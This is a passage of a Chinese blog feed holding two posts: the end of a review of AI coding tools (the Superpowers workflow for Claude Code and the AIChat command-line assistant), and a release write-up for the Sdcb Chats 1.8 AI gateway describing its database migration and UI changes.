个命令</span></span></span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>/superpowers:brainstorm</code><span class=\"md-plain\"> 通过和用户交互来不断改进设计</span></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>/superpowers:write-plan</code><span class=\"md-plain\"> 创建实现方案</span></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s\"><code>/superpowers:execute-plan</code><span class=\"md-plain\"> 批量执行方案</span></span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">下面以开发一个 “用户注册模块” 为例，演示 Superpowers 官方的标准工作流程。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">首先，在终端中运行 <span class=\"md-pair-s\"><code>claude</code><span class=\"md-plain\"> 命令来启动 Claude Code，然后按照下面的 7 个步骤操作：</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">1）Brainstorming 头脑风暴 =&gt; 对齐需求</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">选择 <span class=\"md-pair-s\"><code>/superpowers:brainstorm</code><span class=\"md-plain\"> 命令并输入需求：</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">Superpowers 不会急着写代码，而是先通过多轮问答和你对齐需求，比如：</span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">用户注册模块的主要场景是什么？</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">希望支持哪些注册方式？</span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">通过交互问答，AI 会探索不同方案、不断改进设计。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">当需求和方案确认无误后，它会自动将详细的设计文档保存到 <span class=\"md-pair-s\"><code>docs/plans/</code><span class=\"md-plain\"> 目录。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">2）Using Git Worktrees 创建独立工作空间（可选）</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">设计方案通过后，Superpowers 会帮你创建一个 Git 工作树（worktree），在新分支上建立隔离的工作空间，运行项目初始化，并验证测试基线是否干净。这样可以避免污染主分支。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这一步是可选的，我这里直接让 AI 继续执行，看看会发生什么：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">3）Writing Plans 制定实施计划</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行 <span class=\"md-pair-s\"><code>/superpowers:write-plan</code><span class=\"md-plain\"> 命令，让 Superpowers 生成一份详细的实施计划，把开发任务拆解成多个原子级步骤（每个任务控制在 2 ~ 5 分钟）。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">我这里 AI 直接自动执行了，省了一步命令~</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">查看 AI 生成的实施计划文档，每个任务都包含：</span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">精确的文件路径</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">完整的代码内容</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">验证步骤</span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">好家伙，这哪里是实施计划文档啊，感觉大多数代码都写出来了！</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">4）执行任务</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行 <span class=\"md-pair-s\"><code>/superpowers:execute-plan</code><span class=\"md-plain\"> 命令，Superpowers 会采用以下方式之一执行：</span></span></span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">子代理驱动开发（Subagent-Driven Development）：为每个任务分配一个全新的子代理，经过两阶段审查（规范合规性检查 + 代码质量检查）</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">批量执行（Executing Plans）：分批执行任务，在关键节点暂停让人工检查</span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">我这里 AI 直接问我想要哪种方式：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">我盲选一手 Subagent-Driven 方式，AI 自动选择了对应的开发技能：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">然后 AI 就开始干活了：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">5）Test-Driven Development 测试驱动开发</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在实现过程中，Superpowers 会强制执行 <span class=\"md-pair-s\"><code>红-绿-重构</code><span class=\"md-plain\"> 流程：</span></span></span></p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">先写失败的测试</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行测试，确认失败</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">写最小化的代码让测试通过</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">运行测试，确认通过</span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">提交代码</span></p>\n</li>\n</ul>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">如果发现有代码是在测试之前写的，Superpowers 会删除它，强制你先写测试。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">6）Code Review 代码审查</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">每完成一批任务后，Superpowers 会自动触发代码审查，对照计划检查代码，按严重程度报告问题。如果发现严重问题（Critical），会阻止继续进行。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">7）完成开发</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">所有任务完成后，Superpowers 会验证所有测试是否通过：</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">然后 AI 可能会提供几个选项，比如合并到主分支 / 创建 PR / 保留分支 / 丢弃更改。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">如果你确定功能没有问题，可以利用 Superpowers 内置的技能来完成开发分支的清理工作。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<div class=\"md-hr md-end-block\"><hr /></div>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这套 “先设计后编码” 的规范流程走下来，代码质量会更有保障，不过代价就是速度确实比让 AI 直接生成代码会慢很多。真的是慢很多！就这么个需求我搞了半个多小时！！！</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">如果你正在开发大型项目，需要团队协作，那么可以试试 Superpowers，前期多花的时间会在后期省回来。但是如果你只是想写个简单的脚本或者快速验证一个想法，用它就有点儿牛刀杀鸡了，真没必要。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">AIChat 命令行增强工具</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/sigoden/aichat\" rel=\"noopener nofollow\"><span class=\"md-plain\">AIChat</span></a><span class=\"md-plain\"> 是一个功能完善的 AI 命令行助手，集成了 20+ 主流大模型。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">现在主流的 AI 编程工具（Cursor、VS Code 等）都内置了终端，有时我们需要敲命令来执行任务，但是命令记不住怎么办？</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">用了 AIChat 后，你只需要在终端中说人话，它的 <span class=\"md-pair-s \"><strong>Shell 助手</strong><span class=\"md-plain\"> 能力就会把你的自然语言自动转换成准确可执行的命令。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">使用方法非常简单。打开终端，通过包管理器一行命令就能安装：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span><span class=\"cm-comment\"># macOS/Linux<br /><span>brew install aichat<br /><span><span>​<br /><span><span class=\"cm-comment\"># Windows<br /><span>scoop install aichat</span></span></span></span></span></span></span></span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">安装完成后，运行 <span class=\"md-pair-s\"><code>aichat</code><span class=\"md-plain\"> 命令，首次执行会引导你创建配置，选择你要用的大模型并填写 API Key：</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">然后就可以愉快地跟 AI 对话了：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">但是我个人主要用它的 Shell 助手能力（给命令添加 <span class=\"md-pair-s\"><code>-e</code><span class=\"md-plain\"> 选项），而不是 AI 对话能力。</span></span></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">比如我想批量重命名文件，但不记得命令怎么写，在终端里执行下列命令：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>aichat -e 帮我把当前目录下所有 .txt 文件改成 .md</span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">它就会生成对应的 shell 命令，我确认后它就自动执行了。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">还可以通过快捷键来智能补全命令：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">除了 Shell 助手，AIChat 还有一些进阶功能。比如支持 RAG 检索增强生成，可以让 AI 基于你的本地文档回答问题；支持创建 AI 代理，把指令、工具和文档组合成自动化工作流。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">此外，如果你想对比不同模型的效果，运行 <span class=\"md-pair-s\"><code>aichat --serve</code><span class=\"md-plain\"> 可以启动本地网页界面，同时对比多个模型的回答。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h2 class=\"md-end-block md-heading md-focus\"><span class=\"md-plain md-expand\">最后</span></h2>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">OK，以上就是我推荐的 AI 编程扩展，其中标星 ⭐️ 的是我强烈建议安装的，其他的你可以按需选择安装。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">后续我会深入介绍其中部分扩展的高级用法和实战技巧。如果本期内容对你有帮助，记得点赞收藏三连，欢迎关注鱼皮，不错过更多 AI 编程干货。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这篇文章的文字版我同步到了 <span class=\"md-meta-i-c  md-link\"><a href=\"https://ai.codefather.cn/\" rel=\"noopener nofollow\"><span class=\"md-plain\">鱼皮的 AI 导航网站</span></a><span class=\"md-plain\">，在这里你还可以获取到更多免费的 AI 学习资源、全面的 AI 工具、最新 AI 资讯等等。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">也欢迎在评论区分享你在用的 AI 编程工具，一起进步吧！</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h2 class=\"md-end-block md-heading\"><span class=\"md-plain\">更多编程学习资源</span></h2>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/course\" rel=\"noopener nofollow\"><span class=\"md-plain\">Java前端程序员必做项目实战教程+毕设网站</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/\" rel=\"noopener nofollow\"><span class=\"md-plain\">程序员免费编程学习交流社区（自学必备）</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/course/cv\" rel=\"noopener nofollow\"><span class=\"md-plain\">程序员保姆级求职写简历指南（找工作必备）</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.mianshiya.com/\" rel=\"noopener nofollow\"><span class=\"md-plain\">程序员免费面试刷题网站工具（找工作必备）</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1640584449888772098\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新Java零基础入门学习路线 + Java教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1640586673306091521\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新Python零基础入门学习路线 + Python教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1640586014108303362\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新前端零基础入门学习路线 + 前端教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1640586867363954689\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新数据结构和算法零基础入门学习路线 + 算法教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1644279832026075138\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新C++零基础入门学习路线、C++教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1641797333479903234\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新数据库零基础入门学习路线 + 数据库教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1640589994284695553\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新Redis零基础入门学习路线 + Redis教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1641035880439271426\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新计算机基础入门学习路线 + 计算机基础教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1641366118197153793\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新小程序入门学习路线 + 小程序开发教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"http://sqlmother.yupi.icu/\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新SQL零基础入门学习路线 + SQL教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1640586295529324545\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新Linux零基础入门学习路线 + Linux教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1640588753362108417\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新Git/GitHub零基础入门学习路线 + Git教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1640587909942099969\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新操作系统零基础入门学习路线 + 操作系统教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1640588119619551233\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新计算机网络零基础入门学习路线 + 计算机网络教程</span></a></span></p>\n</li>\n<li class=\"md-list-item\">\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.code-nav.cn/post/1640588392073150465\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新设计模式零基础入门学习路线 + 设计模式教程</span></a></span></p>\n</li>\n<li class=\"md-list-item md-focus-container\">\n<p class=\"md-end-block md-p md-focus\"><span class=\"md-meta-i-c md-link md-expand\"><a href=\"https://www.code-nav.cn/post/1640648711119892481\" rel=\"noopener nofollow\"><span class=\"md-plain\">最新软件工程零基础入门学习路线 + 软件工程教程</span></a></span></p>\n</li>\n</ul>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 11:06</span>&nbsp;\n<a href=\"https://www.cnblogs.com/yupi\">程序员鱼皮</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Sdcb Chats 1.8：又一次底层重构，彻底将模型提供商解耦",
      "link": "https://www.cnblogs.com/sdcb/p/19503012/20260119-chats-180",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/sdcb/p/19503012/20260119-chats-180\" id=\"cb_post_title_url\" title=\"发布于 2026-01-20 08:45\">\n    <span>Sdcb Chats 1.8：又一次底层重构，彻底将模型提供商解耦</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>这是又一篇补档文章，Chats已经发布了1.10，但2025年11月5日发布的1.8版本对我个人来说意义非凡，因为它彻底改变了项目对“模型提供商”的支持方式，从“写死在代码里”变成了“完全配置化”，为后续的可维护性和扩展性打下了坚实基础。</p>\n<p>如果你还不了解 <strong>Sdcb Chats</strong>：简单说，这是一个支持多家主流模型服务商的 AI 网关。它不只能让你在一个统一界面里聚合管理所有模型，同时也兼容标准 API 协议，支持 Docker 一键部署。</p>\n<p>这篇文章聊聊 <strong>Chats 1.8 系列（1.8.0 + 1.8.1）</strong>。它不像“加一个新按钮”那样轻松，而是做了大量“地基工程”：把“模型提供商支持”从静态参考表迁移到了模型实例本身，并且补上了大量用户能直接感知到的体验升级。</p>\n<hr />\n<h2 id=\"18-的核心从静态参考表到模型实例级配置\">1.8 的核心：从“静态参考表”到“模型实例级配置”</h2>\n<p>到 chats 1.7.2 发布以来，已经支持有 18 个模型提供商，我当时为这 18 家模型提供商每一个模型都做了信息和数据跟踪，放到了 ModelReference 表，这个表有 297 条记录了，各大模型提供商卷大模型的速度越来越快，模型更新换代也越来越频繁，要可持续地维护这个表是非常困难的。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170804080-2002986397.png\" /></p>\n<p>除此之外，代码中还有大量根据模型名称写死的逻辑，这导致越来越难以维护。我和项目的合作维护者讨论过许多次，有许多不同的意见，有的说可以继续沿用这种写死的方式，有的说应该做成配置化的方式，但我觉得可持续的维护能力才是我对 chats 项目最重要的承诺，所以我决定在 1.8 版本里彻底重构模型提供商的支持方式，做成完全配置化的方式，这样未来无论是新增模型提供商，还是调整已有模型的支持逻辑，都可以通过配置来完成，而不需要动代码。这个改动虽然在短期内增加了不少工作量，但我相信从长远来看，这会大大提升项目的可维护性和扩展性。</p>\n<p>更技术一点地说：<strong>1.8.0 把“模型能力配置”从 <code>ModelReference</code> 这种静态参考表，迁移到了 <code>Model</code>（模型实例）本身</strong>——模型不再依赖“引用一条固定模板”，而是每个模型实例都拥有完整、可编辑、可验证的能力配置。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170804780-1304764941.png\" /></p>\n<h3 id=\"18-个模型能力字段落到-model终于能真正按实例定制\">18 个“模型能力字段”落到 Model：终于能真正“按实例定制”</h3>\n<p>这次迁移不是口头上的“配置化”，而是实打实的数据库变更：在 <code>src/scripts/db-migration/1.8/1.8.0.sql</code> 里，<code>Model</code> 表新增了一批能力字段（AllowSearch/AllowVision/AllowToolCall/温度范围/上下文窗口/最大输出 token/推理选项/图片尺寸/API 类型等），并且清理了多张静态参考表（<code>ModelReference</code>、<code>ModelProvider</code>、<code>Tokenizer</code>、<code>CurrencyRate</code>、<code>ReasoningResponseKind</code> ……）。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170805164-1145274511.png\" /></p>\n<h3 id=\"第三种-api-类型imagegeneration图像模型终于名正言顺\">第三种 API 类型：ImageGeneration（图像模型终于“名正言顺”）</h3>\n<p>1.8.0 新增了 <code>ApiType.ImageGeneration</code>，把图像生成从“勉强兼容”的逻辑里拎了出来：ChatCompletion / Response / ImageGeneration 三分天下，<code>ChatFactory</code> 也按 <code>ApiType</code> 分派到不同实现。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170805662-834816800.avif\" /></p>\n<h3 id=\"模型验证框架把填错配置的坑提前堵住\">模型验证框架：把“填错配置”的坑提前堵住</h3>\n<p>当能力配置变成“每个模型实例 18 个字段都可编辑”之后，靠用户自觉显然不现实。所以 1.8.0 加了 <code>UpdateModelRequest</code> 的验证框架（包含自定义验证特性和单测），把温度范围、token 上限、字段组合合法性都系统化了。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170806121-2000732051.avif\" /></p>\n<h3 id=\"快速添加模型把配置很多字段的摩擦降下来\">快速添加模型：把“配置很多字段”的摩擦降下来</h3>\n<p>为了对冲“字段变多导致的配置成本”，1.8.0 在后台做了 Quick Add/批量添加模型的流程优化，并补上了默认配置（<code>src/FE/constants/modelDefaults.ts</code> 里能看到一些默认能力/范围策略）。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170806489-55622397.avif\" /></p>\n<h3 id=\"图像链路重构从手写解析器到-imagesharp--全屏预览\">图像链路重构：从“手写解析器”到 ImageSharp + 全屏预览</h3>\n<p>1.8.0 还把图像处理这条链路整体重构了一遍：后端用 ImageSharp 替代了手写解析/嗅探逻辑（代码量直接少了一大截），前端新增了全屏 <code>ImagePreview</code> 组件，支持缩放动画、键盘导航和更顺滑的浏览体验。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170806876-1841292448.avif\" /></p>\n<h3 id=\"骨架屏与按需加载把等待变成可预期\">骨架屏与按需加载：把“等待”变成“可预期”</h3>\n<p>1.8.0 在聊天消息加载、管理后台的模型管理等页面补了骨架屏，并做了按需加载/渐进式渲染：这不是性能“变快了多少 ms”的问题，而是用户感知上从“卡住了”变成“正在加载”。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170807288-1746826065.avif\" /></p>\n<hr />\n<h2 id=\"181在架构变好之后把体验也抠到位\">1.8.1：在“架构变好”之后，把“体验也抠到位”</h2>\n<p>如果说 1.8.0 是地基，那么 1.8.1 更像是把常用路径都重新打磨了一遍：权限、推理内容展示、文件预览、聊天列表性能……这些都是你每天用 Chats 时能立刻感知到的变化。</p>\n<h3 id=\"全新的用户-模型权限管理终于能规模化授权了\">全新的“用户-模型权限”管理：终于能规模化授权了</h3>\n<p>1.8.1 新增了 <code>/admin/user-models</code>（按用户维度管理），同时在模型管理页也增加了“按模型维度管理用户”的入口。更关键的是它的交互设计：<strong>URL 作为状态唯一数据源</strong>，筛选/搜索/展开状态都能分享、刷新不丢。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170807703-1850645716.png\" /><br />\n<img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170808024-210681632.avif\" /></p>\n<h3 id=\"推理内容生命周期追踪--自动折叠屏幕终于不被思考占满\">推理内容“生命周期追踪 + 自动折叠”：屏幕终于不被思考占满</h3>\n<p>推理模型越来越多，推理内容越来越长，UI 不能只“展示”——还得帮用户“管理注意力”。1.8.1 给 <code>ReasoningContent</code> 增加了 <code>finished</code> 语义：推理进行中自动展开、结束后自动折叠；工具调用区块也做了自动折叠与动画，且尊重用户手动操作优先级。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170808347-1492521170.avif\" /></p>\n<h3 id=\"filepreview-组件重构附件展示不再各写一套\">FilePreview 组件重构：附件展示不再“各写一套”</h3>\n<p>1.8.1 引入了统一的 <code>FilePreview</code> 组件：图片/视频/音频直接预览，文档类显示图标+文件名+下载按钮；同时后端把文件处理从 Controller 下沉到了 Service 层，类型检查也更集中。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170808792-1929118479.avif\" /></p>\n<h3 id=\"聊天列表缓存打开就快一点刷新也稳一点\">聊天列表缓存：打开就快一点，刷新也稳一点</h3>\n<p>聊天列表不是什么“酷功能”，但它决定了你每天打开 Chats 的第一感受。1.8.1 里新增了 <code>chatCache.ts</code>：以用户名绑定缓存键、24 小时过期、登出自动清理，并配合并行 API 加载，让首屏更“有感”。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170809126-410299424.png\" /></p>\n<h3 id=\"提供商侧tokenpony-加入azure-openai-更名为-azure-ai-foundry\">提供商侧：TokenPony 加入，Azure OpenAI 更名为 Azure AI Foundry</h3>\n<p>1.8.1 新增了 TokenPony（ID=19），同时把 Azure OpenAI 的命名更新为 Azure AI Foundry（枚举值不变，属于代码层重命名），并补了一个小迁移脚本清理 Azure Host 里的 <code>api-version</code> 参数：<code>src/scripts/db-migration/1.8/1.8.1.sql</code>。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/233608/202601/233608-20260119170809460-172595794.png\" /></p>\n<h3 id=\"兼容性与稳定性openai-26-升级后推理内容解析修复\">兼容性与稳定性：OpenAI 2.6 升级后推理内容解析修复</h3>\n<p>1.8.1 还处理了一个很“现实”的问题：OpenAI 客户端升级到 2.6.0 后，推理内容的解析/解码出现兼容性问题，导致部分推理段无法正确读取。这个点不显眼，但它直接影响你对推理模型的信任感，所以也被纳入 1.8.1 里修掉了。</p>\n<hr />\n<h2 id=\"升级提醒18-系列需要手动跑-sql-server-迁移脚本\">升级提醒：1.8 系列需要手动跑 SQL Server 迁移脚本</h2>\n<p>和 1.7 一样：Sdcb Chats 的数据库变更 <strong>不支持自动数据迁移</strong>。升级到 1.8 